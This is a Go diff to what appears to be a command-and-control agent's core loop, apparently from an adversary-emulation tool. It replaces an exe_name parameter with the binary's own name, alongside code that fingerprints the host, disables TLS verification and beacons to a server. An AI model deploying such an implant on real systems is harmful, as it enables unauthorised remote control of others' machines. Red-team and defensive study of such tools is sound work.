@@ -11,6 +11,7 @@ import (
 	"runtime"
 	"strconv"
 	"time"
+	"path/filepath"
 
 	"../contact"
 	"../execute"
@@ -41,8 +42,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, group string, sleep int, executors []string, privilege string,
-				  exe_name string) map[string]interface{} {
+func buildProfile(server string, group string, sleep int, executors []string, privilege string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 	rand.Seed(time.Now().UnixNano())
@@ -62,7 +62,7 @@ func buildProfile(server string, group string, sleep int, executors []string, pr
 	profile["ppid"] = strconv.Itoa(os.Getppid())
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
-	profile["exe_name"] = exe_name
+	profile["exe_name"] = filepath.Base(os.Args[0])
 	return profile
 }
 
@@ -80,7 +80,7 @@ func chooseCommunicationChannel(profile map[string]interface{}) contact.Contact 
 	return coms
 }
 
-func Core(server string, group string, sleep string, delay int, exe_name string, executors []string, verbose bool) {
+func Core(server string, group string, sleep string, delay int, executors []string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	sleepInt, _ := strconv.Atoi(sleep)
@@ -94,7 +94,7 @@ func Core(server string, group string, sleep string, delay int, exe_name string,
 	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 
-	profile := buildProfile(server, group, sleepInt, executors, privilege, exe_name)
+	profile := buildProfile(server, group, sleepInt, executors, privilege)
 	util.Sleep(float64(delay))
 
 	for {
